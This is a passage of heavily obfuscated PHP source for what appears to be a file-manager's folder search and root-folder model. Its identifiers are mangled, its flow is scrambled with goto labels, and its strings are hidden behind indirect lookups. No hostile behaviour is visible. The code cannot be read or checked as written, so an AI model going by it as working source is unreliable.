fğ²ËÂ¤ÒÜ: if (!$DêÓŸšâî†) { return array(); } $e×œ††ëä• = $DêÓŸšâî†[$bæª‡ËœÆ[167]]; $cÌæ´ëšŸ… = $bæª‡ËœÆ[7]; goto fÕó‚Í¤ß™; bÏ¯ğ„éù–: } public function listPathType($EÅÅ¾ÖäÑ†) { $dî§¨ñ¯á =& $_SERVER[¹Ò‹Ò¹]; $d½íµô­“„ = $this->fileTypeWhere($EÅÅ¾ÖäÑ†); if (!$d½íµô­“„) { return array(); } $f›”ÑÏ­¹¼ = array($dî§¨ñ¯á[544] => SourceModel::TYPE_USER, $dî§¨ñ¯á[545] => USER_ID, $dî§¨ñ¯á[541] => 0, $dî§¨ñ¯á[542] => $d½íµô­“„); return $this->listSource($f›”ÑÏ­¹¼); } public function listSearch($eíÏ–’¡Ö, $EÀ¬óî¨À = 300) { goto A…ĞÍ¿ÚÊŒ; f¨¨Û±‰²Å: $this->_listSearchBindPinyin($eíÏ–’¡Ö, $B¤§“×‰À’, $båæÏƒ°•); $this->alias($díêŸõÅÓ±[511])->_makeOrder(); $B¤§“×‰À’ = $this->parseWhereLike($B¤§“×‰À’); goto DË½¹î‡ë¬; A…ĞÍ¿ÚÊŒ: $díêŸõÅÓ± =& $_SERVER[¹Ò‹Ò¹]; if (isset($eíÏ–’¡Ö[$díêŸõÅÓ±[1752]]) && $eíÏ–’¡Ö[$díêŸõÅÓ±[1752]]) { $eíÏ–’¡Ö[$díêŸõÅÓ±[1752]] = str_replace($díêŸõÅÓ±[379], $díêŸõÅÓ±[1910], trim($eíÏ–’¡Ö[$díêŸõÅÓ±[1752]])); } $B¤§“×‰À’ = $this->_parseSearchWhere($eíÏ–’¡Ö); goto DœÃÉ§ôøÉ; BÔ·‚Ìî‰: $this->_listSearchTag($BÈÒ˜ôº, $eíÏ–’¡Ö, $a²ÑáÔ“Œ“); $this->_listSearchGroupTag($BÈÒ˜ôº, $eíÏ–’¡Ö, $a²ÑáÔ“Œ“); $this->_listDataApply($BÈÒ˜ôº[$díêŸõÅÓ±[365]]); goto c‰¼é– ë; DœÃÉ§ôøÉ: if (!isset($B¤§“×‰À’[$díêŸõÅÓ±[417]])) { $B¤§“×‰À’[$díêŸõÅÓ±[417]] = 0; } $båæÏƒ°• = $díêŸõÅÓ±[1911]; $a²ÑáÔ“Œ“ = $båæÏƒ°•; goto f¨¨Û±‰²Å; c‰¼é– ë: $this->_listMake($BÈÒ˜ôº); return $BÈÒ˜ôº; goto CÆŞøŒŒ÷; DË½¹î‡ë¬: $BÈÒ˜ôº = $this->distinct(!0)->field($båæÏƒ°•)->where($B¤§“×‰À’)->selectPage($EÀ¬óî¨À); $this->_listSearchFileContent($BÈÒ˜ôº, $eíÏ–’¡Ö, $a²ÑáÔ“Œ“); $this->_listSearchDesc($BÈÒ˜ôº, $eíÏ–’¡Ö, $a²ÑáÔ“Œ“); goto BÔ·‚Ìî‰; CÆŞøŒŒ÷: } private function _listSearchFileContent(&$CŒÆîŞÕÒŠ, $b…Ï÷Ù”º¼, $A”ò„™œàÄ) { goto cĞÆ¾œõÆÕ; c½µ±â÷¡„: $CŒÆîŞÕÒŠ[$EñÆãºŸ­ø[365]] = array_merge($døáèè¥èô, $CŒÆîŞÕÒŠ[$EñÆãºŸ­ø[365]]); $CŒÆîŞÕÒŠ[$EñÆãºŸ­ø[362]][$EñÆãºŸ­ø[363]] += count($døáèè¥èô); goto A®–Ó¿¿á; cĞÆ¾œõÆÕ: $EñÆãºŸ­ø =& $_SERVER[¹Ò‹Ò¹]; if (!$b…Ï÷Ù”º¼[$EñÆãºŸ­ø[1752]] || $CŒÆîŞÕÒŠ[$EñÆãºŸ­ø[362]][$EñÆãºŸ­ø[349]] > 1) { return; } $fã¬ßøöŠ¤ = $this->_parseSearchWhere($b…Ï÷Ù”º¼); goto BÀĞ‹‰ò¤®; Fš¬¤‘È»¢: unset($b…Ï÷Ù”º¼[$EñÆãºŸ­ø[441]]); $døáèè¥èô = $this->field($A”ò„™œàÄ)->where($fã¬ßøöŠ¤)->limit($EñÆãºŸ­ø[1912])->select(); if (!$døáèè¥èô || count($døáèè¥èô) == 0) { return; } goto c½µ±â÷¡„; BÀĞ‹‰ò¤®: if (!isset($fã¬ßøöŠ¤[$EñÆãºŸ­ø[28]]) || !is_array($b…Ï÷Ù”º¼[$EñÆãºŸ­ø[441]])) { return; } $fã¬ßøöŠ¤[$EñÆãºŸ­ø[441]] = array($EñÆãºŸ­ø[7], $b…Ï÷Ù”º¼[$EñÆãºŸ­ø[441]]); unset($fã¬ßøöŠ¤[$EñÆãºŸ­ø[28]]); goto Fš¬¤‘È»¢; A®–Ó¿¿á: } private function _listSearchTag(&$C˜¯õ‘¼º«, $e¤½Ñ¿ñ±ì, $eù«Õœìò†) { goto cÒ¾ø•ÓíÈ; cÒ¾ø•ÓíÈ: $a®Ğ²ƒôÆ =& $_SERVER[¹Ò‹Ò¹]; if (!$e¤½Ñ¿ñ±ì[$a®Ğ²ƒôÆ[1752]] || $C˜¯õ‘¼º«[$a®Ğ²ƒôÆ[362]][$a®Ğ²ƒôÆ[349]] > 1) { return; } $dğ¥”µäÔ = Model($a®Ğ²ƒôÆ[1913])->listData(); goto D¹ˆ×“×ê¸; Fæ®°ÂÔ¿¬: if (!$cõÔğ¬À‘) { return; } $AÎÙÎïÄ¿ï = array($a®Ğ²ƒôÆ[413] => array($a®Ğ²ƒôÆ[7], $cõÔğ¬À‘), $a®Ğ²ƒôÆ[1504] => USER_ID); $Aôß£ƒØ = Model($a®Ğ²ƒôÆ[414])->field($a®Ğ²ƒôÆ[75])->where($AÎÙÎïÄ¿ï)->select(); goto A…†åŠ ñ; D¹ˆ×“×ê¸: $cõÔğ¬À‘ = array(); $c¿Æßƒ“ºÊ = $e¤½Ñ¿ñ±ì[$a®Ğ²ƒôÆ[1752]]; foreach ($dğ¥”µäÔ as $D¡‚ÊÔËº) { $e¥éé’èŞ¾ = $D¡‚ÊÔËº[$a®Ğ²ƒôÆ[28]]; $aŒˆ„ëŠ­‡ = str_replace($a®Ğ²ƒôÆ[50], $a®Ğ²ƒôÆ[33], Pinyin::encode($e¥éé’èŞ¾)); if (stripos($e¥éé’èŞ¾, $c¿Æßƒ“ºÊ) !== !1 || stripos($aŒˆ„ëŠ­‡, $c¿Æßƒ“ºÊ) !== !1) { $cõÔğ¬À‘[] = $D¡‚ÊÔËº[$a®Ğ²ƒôÆ[388]]; } } goto Fæ®°ÂÔ¿¬; A…†åŠ ñ: $Aôß£ƒØ = array_to_keyvalue($Aôß£ƒØ, $a®Ğ²ƒôÆ[33], $a®Ğ²ƒôÆ[75]); $fÆö›¤å· = array_unique($Aôß£ƒØ); $this->_listSearchMerge($C˜¯õ‘¼º«, $e¤½Ñ¿ñ±ì, $eù«Õœìò†, $fÆö›¤å·); goto fÇŠåä¨¬­; fÇŠåä¨¬­: } private function _listSearchDesc(&$E¤àÚÈ…Ä, $CÀÔ¿æ»½â, $bßŸ÷ŠÉÉÂ) { goto d ç˜ƒè›Ÿ; FÖÊ¼æ“Î: $b¨Ù¯›Şšğ = array_unique($b¨Ù¯›Şšğ); if (!$b¨Ù¯›Şšğ) { return; } $eÂ“øˆˆ… = array($f±Ë•æ†ò[390] => array($f±Ë•æ†ò[7], $b¨Ù¯›Şšğ), $f±Ë•æ†ò[92] => $f±Ë•æ†ò[425], $f±Ë•æ†ò[370] => array($f±Ë•æ†ò[378], $f±Ë•æ†ò[1754] . $CÀÔ¿æ»½â[$f±Ë•æ†ò[1752]] . $f±Ë•æ†ò[1754])); goto dòÒ“Èéó ; d ç˜ƒè›Ÿ: $f±Ë•æ†ò =& $_SERVER[¹Ò‹Ò¹]; if (!$CÀÔ¿æ»½â[$f±Ë•æ†ò[1752]] || $E¤àÚÈ…Ä[$f±Ë•æ†ò[362]][$f±Ë•æ†ò[349]] > 1) { return; } $b¨Ù¯›Şšğ = $this->listSearchChildren($CÀÔ¿æ»½â[$f±Ë•æ†ò[472]]); goto FÖÊ¼æ“Î; dòÒ“Èéó : $d‹Õ¯¨Š = Model($f±Ë•æ†ò[527])->field($f±Ë•æ†ò[390])->where($eÂ“øˆˆ…)->select(); $C©Ñ‰“§Œï = array_to_keyvalue($d‹Õ¯¨Š, $f±Ë•æ†ò[33], $f±Ë•æ†ò[390]); $this->_listSearchMerge($E¤àÚÈ…Ä, $CÀÔ¿æ»½â, $bßŸ÷ŠÉÉÂ, $C©Ñ‰“§Œï); goto BòÕÄ°ªé¯; BòÕÄ°ªé¯: } private function _listSearchGroupTag(&$D­‚œ„…Šë, $c‡ø–ªÀÅĞ, $DÊùì˜…‡) { goto A— ½›ÉÎ–; A— ½›ÉÎ–: $DØÒß»åù® =& $_SERVER[¹Ò‹Ò¹]; if (!$c‡ø–ªÀÅĞ[$DØÒß»åù®[1752]] || $D­‚œ„…Šë[$DØÒß»åù®[362]][$DØÒß»åù®[349]] > 1 || !$c‡ø–ªÀÅĞ[$DØÒß»åù®[472]]) { return; } $D¸‚ÒáĞÍë = $this->sourceInfo($c‡ø–ªÀÅĞ[$DØÒß»åù®[472]]); goto a†×ïÃÊ¤; f–¦ÑËâšî: $Aâïõøäš = array_to_keyvalue($Aâïõøäš, $DØÒß»åù®[33], $DØÒß»åù®[75]); $Dœ¶Ä“˜È = array_unique($Aâïõøäš); $this->_listSearchMerge($D­‚œ„…Šë, $c‡ø–ªÀÅĞ, $DÊùì˜…‡, $Dœ¶Ä“˜È); goto a‚½Ê˜Ğôç; a†×ïÃÊ¤: if (!$D¸‚ÒáĞÍë || $D¸‚ÒáĞÍë[$DØÒß»åù®[398]] != SourceModel::TYPE_GROUP) { return; } $EÀœ›¦ë¸ù = $D¸‚ÒáĞÍë[$DØÒß»åù®[478]]; $dÒ“§¸í¸ = Model($DØÒß»åù®[1914])->get($EÀœ›¦ë¸ù); goto b²Ší÷òöƒ; C†Ö¾„Û«¡: if (!$BŞ…ßçØğ¦) { return; } $bØªäàšÍõ = array($DØÒß»åù®[413] => array($DØÒß»åù®[7], $BŞ…ßçØğ¦), $DØÒß»åù®[1504] => 0, $DØÒß»åù®[29] => $DØÒß»åù®[1776] . $EÀœ›¦ë¸ù); $Aâïõøäš = Model($DØÒß»åù®[414])->field($DØÒß»åù®[75])->where($bØªäàšÍõ)->select(); goto f–¦ÑËâšî; b²Ší÷òöƒ: $BŞ…ßçØğ¦ = array(); $bã×¥‚¼® = $c‡ø–ªÀÅĞ[$DØÒß»åù®[1752]]; foreach ($dÒ“§¸í¸[$DØÒß»åù®[365]] as $e–İê¡àÇÓ) { $DàÌ‡¸¿— = $e–İê¡àÇÓ[$DØÒß»åù®[28]]; $A»ÚòæÂ¹ô = str_replace($DØÒß»åù®[50], $DØÒß»åù®[33], Pinyin::encode($DàÌ‡¸¿—)); if (stripos($DàÌ‡¸¿—, $bã×¥‚¼®) !== !1 || stripos($A»ÚòæÂ¹ô, $bã×¥‚¼®) !== !1) { $BŞ…ßçØğ¦[] = $e–İê¡àÇÓ[$DØÒß»åù®[388]]; } } goto C†Ö¾„Û«¡; a‚½Ê˜Ğôç: } private function _listSearchMerge(&$AƒÖ¨¯Ë¥ï, $C·š§½¬„­, $fáÄ‰Íƒ‘, $bÌöí˜ÔæÖ) { goto C±šŒğ¶¤¬; B‚š–Ä†: $fº¶ˆ¦áŸ = $this->field($fáÄ‰Íƒ‘)->where($c®Ùùğ•Ãƒ)->select(); if (!$fº¶ˆ¦áŸ) { return; } $b•ß×Öáä’ = array(); goto cØÓ…­£˜; C±šŒğ¶¤¬: $bëÉ«ŠºÂ½ =& $_SERVER[¹Ò‹Ò¹]; if (!$bÌöí˜ÔæÖ) { return; } $A°ê²÷ê„æ = array_to_keyvalue($AƒÖ¨¯Ë¥ï[$bëÉ«ŠºÂ½[365]], $bëÉ«ŠºÂ½[33], $bëÉ«ŠºÂ½[390]); goto Bã°à³ß×œ; Bã°à³ß×œ: $EñìèİĞÃŠ = array_diff($bÌöí˜ÔæÖ, $A°ê²÷ê„æ); if (!$EñìèİĞÃŠ) { return; } $c®Ùùğ•Ãƒ = array($bëÉ«ŠºÂ½[390] => array($bëÉ«ŠºÂ½[7], $EñìèİĞÃŠ)); goto B‚š–Ä†; cØÓ…­£˜: foreach ($fº¶ˆ¦áŸ as $d³“‹›ƒ) { if ($this->_listSearchFilter($d³“‹›ƒ, $C·š§½¬„­)) { $b•ß×Öáä’[] = $d³“‹›ƒ; } } $AƒÖ¨¯Ë¥ï[$bëÉ«ŠºÂ½[365]] = array_merge($b•ß×Öáä’, $AƒÖ¨¯Ë¥ï[$bëÉ«ŠºÂ½[365]]); $AƒÖ¨¯Ë¥ï[$bëÉ«ŠºÂ½[362]][$bëÉ«ŠºÂ½[363]] += count($b•ß×Öáä’); goto Fô…¼„‚òº; Fô…¼„‚òº: } private function _listSearchFilter($CÀíî´·÷, $BŞº²–’Ü¹) { goto F«Ë‰Æù±Õ; EéÅ´•Õéó: if (isset($BŞº²–’Ü¹[$a¿ô‚ñ²ºÈ[399]]) && $BŞº²–’Ü¹[$a¿ô‚ñ²ºÈ[399]] != $a¿ô‚ñ²ºÈ[1718]) { if ($BŞº²–’Ü¹[$a¿ô‚ñ²ºÈ[399]] == $a¿ô‚ñ²ºÈ[76] && !$DˆÍçˆŸ…º) { return !1; } if ($BŞº²–’Ü¹[$a¿ô‚ñ²ºÈ[399]] != $a¿ô‚ñ²ºÈ[76] && $DˆÍçˆŸ…º) { return !1; } if (!strstr($CÀíî´·÷[$a¿ô‚ñ²ºÈ[167]], $a¿ô‚ñ²ºÈ[47] . $BŞº²–’Ü¹[$a¿ô‚ñ²ºÈ[399]] . $a¿ô‚ñ²ºÈ[47])) { return !1; } } if (isset($BŞº²–’Ü¹[$a¿ô‚ñ²ºÈ[1915]]) && $BŞº²–’Ü¹[$a¿ô‚ñ²ºÈ[1915]] < $CÀíî´·÷[$a¿ô‚ñ²ºÈ[77]]) { return !1; } if (isset($BŞº²–’Ü¹[$a¿ô‚ñ²ºÈ[1916]]) && $BŞº²–’Ü¹[$a¿ô‚ñ²ºÈ[1916]] > $CÀíî´·÷[$a¿ô‚ñ²ºÈ[77]]) { return !1; } goto aöŠ°»¼«; F«Ë‰Æù±Õ: $a¿ô‚ñ²ºÈ =& $_SERVER[¹Ò‹Ò¹]; $DˆÍçˆŸ…º = $CÀíî´·÷[$a¿ô‚ñ²ºÈ[397]] == $a¿ô‚ñ²ºÈ[86]; if (!strstr($CÀíî´·÷[$a¿ô‚ñ²ºÈ[481]], $a¿ô‚ñ²ºÈ[47] . $BŞº²–’Ü¹[$a¿ô‚ñ²ºÈ[472]] . $a¿ô‚ñ²ºÈ[47])) { return !1; } goto EéÅ´•Õéó; aöŠ°»¼«: if (isset($BŞº²–’Ü¹[$a¿ô‚ñ²ºÈ[557]]) && $BŞº²–’Ü¹[$a¿ô‚ñ²ºÈ[557]] != $CÀíî´·÷[$a¿ô‚ñ²ºÈ[428]]) { return !1; } return !0; goto fìŠ˜è’¾Ê; fìŠ˜è’¾Ê: } public function listSearchChildren($cè‘§ñ÷‚Ğ, $FîŠ´Í¬ = 5000) { goto E¾óŞ´Óã¿; E¾óŞ´Óã¿: $FÖÇ–Úœ‹Î =& $_SERVER[¹Ò‹Ò¹]; $dˆ‹Š¿„± = array(); $féœÚøÖÌç = $this->sourceInfo($cè‘§ñ÷‚Ğ); goto cÃÓĞ¡Ì; cÃÓĞ¡Ì: $e¨ÜõÈÊ‹¹ = array($FÖÇ–Úœ‹Î[481] => array($FÖÇ–Úœ‹Î[378], $féœÚøÖÌç[$FÖÇ–Úœ‹Î[481]] . $féœÚøÖÌç[$FÖÇ–Úœ‹Î[390]] . $FÖÇ–Úœ‹Î[508])); $cÙò¬”Í± = $this->field($FÖÇ–Úœ‹Î[390])->cache(null, 600)->where($e¨ÜõÈÊ‹¹)->count(); if ($cÙò¬”Í± > $FîŠ´Í¬) { return $this->_listSearchChildrenNear($cè‘§ñ÷‚Ğ, $FîŠ´Í¬); } goto AÂÄÆÏ«Ûá; AÂÄÆÏ«Ûá: $CÊ²¼øë°Ÿ = $this->field($FÖÇ–Úœ‹Î[390])->where($e¨ÜõÈÊ‹¹)->select(); $dˆ‹Š¿„± = array_to_keyvalue($CÊ²¼øë°Ÿ, $FÖÇ–Úœ‹Î[33], $FÖÇ–Úœ‹Î[390]); return $dˆ‹Š¿„±; goto cæ’‰ÂŠ“ë; cæ’‰ÂŠ“ë: } private function _listSearchChildrenNear($bÉ†‡Şë†, $aåò¬¾‹„¡) { goto F…Ëôšè¢–; F…Ëôšè¢–: $eƒƒ¥ÎÆ÷ =& $_SERVER[¹Ò‹Ò¹]; $BÕìŠ¬è© = array(); $aËƒŠˆöÈ = array($eƒƒ¥ÎÆ÷[472] => $bÉ†‡Şë†); goto aøâÜ¿Èßæ; Cí··‘òïª: $BÕìŠ¬è© = array_merge($BÕìŠ¬è©, array_to_keyvalue($FéÉÛ…á’‰, $eƒƒ¥ÎÆ÷[33], $eƒƒ¥ÎÆ÷[390])); $BÕìŠ¬è© = array_slice($BÕìŠ¬è©, 0, $aåò¬¾‹„¡); return $BÕìŠ¬è©; goto DˆòÕ‡§©; cÃëÑæ¨“›: if (!$f¯±¾³ö»») { return $BÕìŠ¬è©; } $aËƒŠˆöÈ = array($eƒƒ¥ÎÆ÷[472] => array($eƒƒ¥ÎÆ÷[7], $f¯±¾³ö»»)); $FéÉÛ…á’‰ = $this->field($eƒƒ¥ÎÆ÷[1917])->where($aËƒŠˆöÈ)->limit($aåò¬¾‹„¡)->select(); goto Cí··‘òïª; aøâÜ¿Èßæ: $FéÉÛ…á’‰ = $this->field($eƒƒ¥ÎÆ÷[1917])->where($aËƒŠˆöÈ)->select(); $f¯±¾³ö»» = array_to_keyvalue(array_filter_by_field($FéÉÛ…á’‰, $eƒƒ¥ÎÆ÷[397], $eƒƒ¥ÎÆ÷[86]), $eƒƒ¥ÎÆ÷[33], $eƒƒ¥ÎÆ÷[390]); $BÕìŠ¬è© = array_merge($BÕìŠ¬è©, array_to_keyvalue($FéÉÛ…á’‰, $eƒƒ¥ÎÆ÷[33], $eƒƒ¥ÎÆ÷[390])); goto cÃëÑæ¨“›; DˆòÕ‡§©: } private function _listSearchBindPinyin($fµÓìˆÈ, &$A¸ã‰ó‘Ì”, &$a‰”¼ˆ¾) { goto Fëêºáºš”; Bêñ¹‡‰: $Fô‡î­åóĞ = "\x4c\105\106\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\151\157\x5f\x73\x6f\x75\x72\x63\145\x5f\x6d\145\x74\x61\40\x6d\x65\x74\141\x20\x6f\x6e\40\x73\x6f\x75\162\143\145\x2e\x73\157\165\162\143\145\111\104\x20\75\x20\x6d\x65\164\141\56\163\x6f\165\x72\143\145\x49\104"; $aÚ¹öö»êÊ = array(); $a‰”¼ˆ¾ = str_replace(array($A¶ÖŒ‡ƒ±ã[227], $A¶ÖŒ‡ƒ±ã[50], $A¶ÖŒ‡ƒ±ã[1918]), $A¶ÖŒ‡ƒ±ã[33], $a‰”¼ˆ¾); goto d¯ôÚ‡ÚÜ·; d¯ôÚ‡ÚÜ·: $a‰”¼ˆ¾ = $A¶ÖŒ‡ƒ±ã[1919] . str_replace($A¶ÖŒ‡ƒ±ã[47], $A¶ÖŒ‡ƒ±ã[1920], $a‰”¼ˆ¾); $EØÌÚï¬ÉÁ = $A¸ã‰ó‘Ì”[$A¶ÖŒ‡ƒ±ã[28]]; unset($A¸ã‰ó‘Ì”[$A¶ÖŒ‡ƒ±ã[28]]); goto CøçÀ¾«È; Fëêºáºš”: $A¶ÖŒ‡ƒ±ã =& $_SERVER[¹Ò‹Ò¹]; if (!isset($fµÓìˆÈ[$A¶ÖŒ‡ƒ±ã[1752]]) || !$fµÓìˆÈ[$A¶ÖŒ‡ƒ±ã[1752]]) { return; } if (!Input::check($fµÓìˆÈ[$A¶ÖŒ‡ƒ±ã[1752]], $A¶ÖŒ‡ƒ±ã[314]) || strlen($fµÓìˆÈ[$A¶ÖŒ‡ƒ±ã[1752]]) < 2) { return; } goto Bêñ¹‡‰; CøçÀ¾«È: foreach ($A¸ã‰ó‘Ì” as $Cèº…†Ş¿¸ => $cãÃÁµ™šç) { $aÚ¹öö»êÊ[$A¶ÖŒ‡ƒ±ã[1919] . $Cèº…†Ş¿¸] = $cãÃÁµ™šç; } foreach ($EØÌÚï¬ÉÁ as $fÀ’ÏÁé¼) { $aÚ¹öö»êÊ[] = array($A¶ÖŒ‡ƒ±ã[1921] => $fÀ’ÏÁé¼, $A¶ÖŒ‡ƒ±ã[933] => $A¶ÖŒ‡ƒ±ã[1756], array($A¶ÖŒ‡ƒ±ã[1922] => $fÀ’ÏÁé¼, $A¶ÖŒ‡ƒ±ã[1923] => array($A¶ÖŒ‡ƒ±ã[7], array($A¶ÖŒ‡ƒ±ã[438], $A¶ÖŒ‡ƒ±ã[437])))); } $this->join($Fô‡î­åóĞ); goto CƒÅÌèå¥Å; CƒÅÌèå¥Å: $A¸ã‰ó‘Ì” = $aÚ¹öö»êÊ; goto f¹õ™“ëˆ’; f¹õ™“ëˆ’: } private function _parseSearchWhere($d°—‚ª£çÍ) { goto c”™ÂÊ´«Ä; e—”“÷ùí¼: if (isset($d°—‚ª£çÍ[$fêË‹óç¤Ñ[557]]) && $d°—‚ª£çÍ[$fêË‹óç¤Ñ[557]]) { $bÜÃÎˆ£»°[] = array($fêË‹óç¤Ñ[428] => $d°—‚ª£çÍ[$fêË‹óç¤Ñ[557]], $fêË‹óç¤Ñ[426] => $d°—‚ª£çÍ[$fêË‹óç¤Ñ[557]], $fêË‹óç¤Ñ[933] => $fêË‹óç¤Ñ[1756]); } if (isset($d°—‚ª£çÍ[$fêË‹óç¤Ñ[399]]) && $d°—‚ª£çÍ[$fêË‹óç¤Ñ[399]]) { $EÅÄ‹…±Ïô = $d°—‚ª£çÍ[$fêË‹óç¤Ñ[399]]; if ($EÅÄ‹…±Ïô == $fêË‹óç¤Ñ[76]) { $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[397]] = 1; } else { if ($EÅÄ‹…±Ïô == $fêË‹óç¤Ñ[1927]) { $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[397]] = 0; } else { if ($EÅÄ‹…±Ïô) { $EÅÄ‹…±Ïô = is_array($EÅÄ‹…±Ïô) ? $EÅÄ‹…±Ïô : explode($fêË‹óç¤Ñ[47], $EÅÄ‹…±Ïô); $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[399]] = array($fêË‹óç¤Ñ[405], $EÅÄ‹…±Ïô); $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[397]] = 0; } } } } if (isset($d°—‚ª£çÍ[$fêË‹óç¤Ñ[472]]) && $d°—‚ª£çÍ[$fêË‹óç¤Ñ[472]]) { $B•‰™¥— = $this->sourceInfo($d°—‚ª£çÍ[$fêË‹óç¤Ñ[472]]); $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[548]] = array($fêË‹óç¤Ñ[507], $B•‰™¥—[$fêË‹óç¤Ñ[481]] . $d°—‚ª£çÍ[$fêË‹óç¤Ñ[472]] . $fêË‹óç¤Ñ[508]); } goto C­¾…Œ÷±Ğ; AŸòˆ½„™•: if (isset($d°—‚ª£çÍ[$fêË‹óç¤Ñ[470]]) && $d°—‚ª£çÍ[$fêË‹óç¤Ñ[470]]) { $AœÒƒ©®¥Œ = array($fêË‹óç¤Ñ[1925], $d°—‚ª£çÍ[$fêË‹óç¤Ñ[470]]); if ($bÜÃÎˆ£»°[$fêË‹óç¤Ñ[83]]) { $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[83]] = array($bÜÃÎˆ£»°[$fêË‹óç¤Ñ[83]], $AœÒƒ©®¥Œ, $fêË‹óç¤Ñ[1926]); } else { $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[83]] = $AœÒƒ©®¥Œ; } } if (isset($d°—‚ª£çÍ[$fêË‹óç¤Ñ[1915]]) && $d°—‚ª£çÍ[$fêË‹óç¤Ñ[1915]] > 0) { $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[77]] = array($fêË‹óç¤Ñ[1924], $d°—‚ª£çÍ[$fêË‹óç¤Ñ[1915]]); } if (isset($d°—‚ª£çÍ[$fêË‹óç¤Ñ[1916]]) && $d°—‚ª£çÍ[$fêË‹óç¤Ñ[1916]]) { $AœÒƒ©®¥Œ = array($fêË‹óç¤Ñ[1925], $d°—‚ª£çÍ[$fêË‹óç¤Ñ[1916]]); if ($bÜÃÎˆ£»°[$fêË‹óç¤Ñ[77]]) { $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[77]] = array($bÜÃÎˆ£»°[$fêË‹óç¤Ñ[77]], $AœÒƒ©®¥Œ, $fêË‹óç¤Ñ[1926]); } else { $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[77]] = $AœÒƒ©®¥Œ; } } goto e—”“÷ùí¼; C­¾…Œ÷±Ğ: if (isset($d°—‚ª£çÍ[$fêË‹óç¤Ñ[1752]]) && trim($d°—‚ª£çÍ[$fêË‹óç¤Ñ[1752]])) { $bÄ”‹Ø½ïµ = trim($d°—‚ª£çÍ[$fêË‹óç¤Ñ[1752]]); $aÃ¨¦ìºÄ‰ = explode($fêË‹óç¤Ñ[50], $bÄ”‹Ø½ïµ); if (strlen($bÄ”‹Ø½ïµ) > 2 && (substr($bÄ”‹Ø½ïµ, 0, 1) == $fêË‹óç¤Ñ[115] && substr($bÄ”‹Ø½ïµ, -1) == $fêË‹óç¤Ñ[115]) || substr($bÄ”‹Ø½ïµ, 0, 1) == $fêË‹óç¤Ñ[55] && substr($bÄ”‹Ø½ïµ, -1) == $fêË‹óç¤Ñ[55]) { $bÄ”‹Ø½ïµ = substr($bÄ”‹Ø½ïµ, 1, -1); $aÃ¨¦ìºÄ‰ = array($bÄ”‹Ø½ïµ); } $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[28]] = array(array($fêË‹óç¤Ñ[507], $fêË‹óç¤Ñ[1754] . $bÄ”‹Ø½ïµ . $fêË‹óç¤Ñ[1754])); if (count($aÃ¨¦ìºÄ‰) > 1) { $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[28]] = array(); foreach ($aÃ¨¦ìºÄ‰ as $Aˆ…éäÑš†) { if (!trim($Aˆ…éäÑš†)) { continue; } $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[28]][] = array($fêË‹óç¤Ñ[507], $fêË‹óç¤Ñ[1754] . trim($Aˆ…éäÑš†) . $fêË‹óç¤Ñ[1754]); } } } return $bÜÃÎˆ£»°; goto DïäóóÃÒ–; c”™ÂÊ´«Ä: $fêË‹óç¤Ñ =& $_SERVER[¹Ò‹Ò¹]; $bÜÃÎˆ£»° = array(); if (isset($d°—‚ª£çÍ[$fêË‹óç¤Ñ[717]]) && $d°—‚ª£çÍ[$fêË‹óç¤Ñ[717]]) { $bÜÃÎˆ£»°[$fêË‹óç¤Ñ[83]] = array($fêË‹óç¤Ñ[1924], $d°—‚ª£çÍ[$fêË‹óç¤Ñ[717]]); } goto AŸòˆ½„™•; DïäóóÃÒ–: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($D¤Ã†öêñ) { $eÃ×±È‰°Ø =& $_SERVER[¹Ò‹Ò¹]; $eĞÄÌ•¼„ò = Model($eÃ×±È‰°Ø[497])->where(array($eÃ×±È‰°Ø[1496] => $D¤Ã†öêñ))->find(); $cØˆÆùšã§ = $this->_mkdirRoot(SourceModel::TYPE_USER, $D¤Ã†öêñ, $eĞÄÌ•¼„ò[$eÃ×±È‰°Ø[28]]); $this->userDesktopAdd($cØˆÆùšã§); return $cØˆÆùšã§; } public function userDesktopAdd($e»‡ÌÓí•) { $F‡Á’•°ƒ =& $_SERVER[¹Ò‹Ò¹]; $e¨àØâå = LNG($F‡Á’•°ƒ[1928]); $BÇÈñ×‚™ = $this->mkdir($e»‡ÌÓí•, $e¨àØâå); $this->metaSet($BÇÈñ×‚™, $F‡Á’•°ƒ[1929], $F‡Á’•°ƒ[86]); $this->metaSet($e»‡ÌÓí•, $F‡Á’•°ƒ[1930], $BÇÈñ×‚™); } public function groupRootAdd($AŒÁ‹¬‡áÍ) { $AÓÆºÚÆì¯ =& $_SERVER[¹Ò‹Ò¹]; $b²«µÇ™°Â = Model($AÓÆºÚÆì¯[480])->where(array($AÓÆºÚÆì¯[1747] => $AŒÁ‹¬‡áÍ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $AŒÁ‹¬‡áÍ, $b²«µÇ™°Â[$AÓÆºÚÆì¯[28]]); } public function systemRootPathAdd($eãŞÌ™£‰) { if ($eãŞÌ™£‰ != $_SERVER[¹Ò‹Ò¹][500]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $eãŞÌ™£‰); } public function userRootRemove($Bğ˜Ã‚®Ä²) { $cŞÑÖ“ÎÙÄ = $this->sourceRoot(SourceModel::TYPE_USER, $Bğ˜Ã‚®Ä²); if (!$cŞÑÖ“ÎÙÄ) { return; } $this->remove($cŞÑÖ“ÎÙÄ, !1); } public function groupRootRemove($D˜„‡É„‘) { $AØÜšòƒŠ = $this->sourceRoot(SourceModel::TYPE_GROUP, $D˜„‡É„‘); if (!$AØÜšòƒŠ) { return; } $this->remove($AØÜšòƒŠ, !1); } private function _mkdirRoot($eÂ©ŒØˆ™À, $E¶¸Ë³áĞ’, $C…ƒ‡‹áÑœ) { goto C­œë›Å²¹; fç¹®çáÑ‹: CacheLock::unlock($bÖˆñƒäéì); return $D˜ÈÌ»ŒÙ‰; goto F°­Ôó†½; C­œë›Å²¹: $cô‰ÛÄæ§· =& 